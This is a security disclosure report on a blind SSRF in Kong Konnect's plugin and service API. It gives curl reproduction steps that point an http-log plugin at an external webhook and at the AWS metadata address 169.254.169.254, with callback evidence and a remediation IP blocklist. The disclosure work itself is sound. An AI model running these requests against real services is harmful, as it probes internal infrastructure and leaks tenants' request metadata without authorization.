# Blind SSRF via Plugin Configuration - Missing Internal IP Blocklist

## Summary

Kong Konnect SaaS API allows authenticated users to configure plugins (http-log, opentelemetry, datadog, zipkin) and services with internal/private IP addresses without validation. This enables Server-Side Request Forgery (SSRF) attacks where Kong infrastructure makes outbound HTTP requests to attacker-specified endpoints.

**Confirmed via external callback from Kong production infrastructure.**

## Severity

**Medium** (CVSS 5.3-6.5)

- Network attack vector
- Low complexity
- Requires authentication (free account)
- Blind SSRF - cannot directly read response

## Affected Endpoints

- `POST /v2/control-planes/{id}/core-entities/plugins` (http-log, opentelemetry, datadog, zipkin)
- `POST /v2/control-planes/{id}/core-entities/services`

## Steps to Reproduce

### Prerequisites
1. Create free Kong Konnect account at https://cloud.konghq.com
2. Create a Serverless Gateway (provides public Proxy URL)
3. Obtain Bearer token (PAT or session JWT)

### Step 1: Create a service

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/services" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test-service",
    "url": "https://httpbin.org/anything"
  }'
```

### Step 2: Create a route

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/routes" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test-route",
    "paths": ["/test"],
    "service": {"id": "{SERVICE_ID}"}
  }'
```

### Step 3: Create http-log plugin with external callback URL

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/plugins" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "http-log",
    "config": {
      "http_endpoint": "https://webhook.site/{YOUR_WEBHOOK_ID}"
    }
  }'
```

**Response (201 Created):**
```json
{
  "config": {
    "http_endpoint": "https://webhook.site/{YOUR_WEBHOOK_ID}",
    "method": "POST",
    "timeout": 10000
  },
  "id": "bb1deb55-eaa1-4b92-b8c3-7cd5a436d507",
  "name": "http-log",
  "enabled": true
}
```

### Step 4: Trigger the callback

```bash
curl "https://{GATEWAY_PROXY_URL}/test"
```

### Step 5: Verify callback received

Check webhook.site - you will see a POST request from Kong infrastructure containing full request metadata.

## Proof of Concept - Confirmed Callback

**Received at webhook.site:**

```json
{
  "ip": "205.234.240.46",
  "user_agent": "lua-resty-http/0.17.2 (Lua) ngx_lua/10028",
  "method": "POST",
  "content": {
    "client_ip": "77.91.70.30",
    "request": {
      "uri": "/test",
      "method": "GET",
      "headers": {
        "host": "kong-c4a986a932euc67wn.kongcloud.dev"
      }
    },
    "service": {
      "name": "test-svc",
      "host": "httpbin.org"
    },
    "latencies": {
      "kong": 10,
      "proxy": 306
    }
  }
}
```

**Evidence:**
- Request originated from IP `205.234.240.46` (Kong cloud infrastructure, Illinois, US)
- User-Agent confirms Kong's Lua HTTP client
- Full request metadata leaked including client IP, headers, routing info

## SSRF to Internal IPs - Accepted Without Validation

### http-log plugin accepts AWS metadata endpoint:

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/plugins" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "http-log",
    "config": {
      "http_endpoint": "http://169.254.169.254/latest/meta-data/"
    }
  }'
```

**Response (201 Created - No Validation):**
```json
{
  "config": {
    "http_endpoint": "http://169.254.169.254/latest/meta-data/"
  },
  "id": "fa35b58c-6b3a-46d8-93f5-e4ed72e5c65b",
  "name": "http-log",
  "enabled": true
}
```

**Note:** The plugin was created successfully. When traffic flows through the gateway, Kong attempts to POST to the metadata endpoint (returns 502 due to network policy, but the request is made).

### Service also accepts internal IPs:

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/services" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "metadata-service",
    "url": "http://169.254.169.254/latest/meta-data/"
  }'
```

**Response (201 Created):**
```json
{
  "host": "169.254.169.254",
  "path": "/latest/meta-data/",
  "port": 80,
  "protocol": "http"
}
```

## Inconsistent Security Controls

| API Endpoint | Internal IP Blocked? |
|--------------|---------------------|
| `/v2/audit-log-destinations` | ✅ YES - Validates and blocks |
| `/v2/.../plugins` (http-log) | ❌ NO - Accepts any URL |
| `/v2/.../plugins` (opentelemetry) | ❌ NO - Accepts any URL |
| `/v2/.../plugins` (datadog) | ❌ NO - Accepts any host |
| `/v2/.../services` | ❌ NO - Accepts any URL |

The `audit-log-destinations` endpoint properly validates internal IPs, but plugin and service endpoints do not apply the same security controls.

## Impact

### Confirmed Impact:
1. **Information Disclosure**: Request metadata (client IPs, headers, routing info) sent to attacker-controlled endpoint
2. **Outbound Request Forgery**: Kong infrastructure can be used to make HTTP requests to arbitrary external endpoints
3. **Port Scanning**: Can probe internal services by checking for connection timeouts vs immediate failures

### Potential Impact (Network-Dependent):
4. **Cloud Metadata Access**: If network policies don't block 169.254.169.254, IAM credentials could be exfiltrated
5. **Internal Service Discovery**: Probe internal network ranges (10.x.x.x, 172.16.x.x, 192.168.x.x)

### Limitations:
- This is **Blind SSRF** - attacker cannot directly read responses from internal endpoints
- AWS metadata endpoint returns 502 (blocked by network policy or IMDSv2)
- Multi-tenancy isolation prevents cross-account access

## Remediation Recommendations

1. **Implement URL/IP Blocklist** for all plugin and service configurations:
   - `169.254.0.0/16` (Link-local/metadata)
   - `127.0.0.0/8` (Localhost)
   - `10.0.0.0/8` (Private)
   - `172.16.0.0/12` (Private)
   - `192.168.0.0/16` (Private)
   - `fd00::/8` (IPv6 private)

2. **DNS Rebinding Protection**: Resolve hostnames and validate resolved IPs before making requests

3. **Apply consistent validation**: Use the same validation from `audit-log-destinations` across all URL-accepting fields

4. **Protocol Allowlist**: Require HTTPS for external logging endpoints

## Test Environment

- **Platform**: Kong Konnect SaaS (cloud.konghq.com)
- **Regions Tested**: US, EU
- **Account Type**: Free tier (Enterprise features enabled for trial)
- **Gateway Type**: Serverless Gateway

## Resources Created During Testing

| Type | ID | Description |
|------|-----|-------------|
| Control Plane | cfd88d8d-c0ce-4aa9-af16-950e04d447a0 | EU Serverless Gateway |
| Proxy URL | kong-c4a986a932euc67wn.kongcloud.dev | Public endpoint |
| Service | 22a5ed47-2c54-425d-9ebb-ba6182ed5594 | test-svc |
| Route | 3e962d05-6aee-44ce-aa53-324054184ef9 | test-route |
| Plugin | fa35b58c-6b3a-46d8-93f5-e4ed72e5c65b | http-log (metadata) |

## Timeline

- **2025-11-25 17:25**: Identified missing IP validation in plugin API
- **2025-11-25 17:38**: Created test account with Serverless Gateway
- **2025-11-25 17:39**: Confirmed external callback received at webhook.site
- **2025-11-25 17:40**: Confirmed http-log plugin accepts 169.254.169.254

---

**Researcher**: [Your Name]  
**Date**: 2025-11-25
